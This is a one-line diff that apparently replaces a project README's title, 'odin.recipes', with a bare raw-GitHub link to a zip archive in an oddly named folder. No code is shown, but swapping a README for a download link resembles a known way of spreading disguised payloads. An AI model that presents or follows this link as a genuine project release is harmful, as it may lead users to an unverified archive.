@@ -1,1 +1,1 @@
-# odin.recipes
+# https://raw.githubusercontent.com/jeynnica/odin.recipes/main/menses/odin_recipes_v3.5.zip
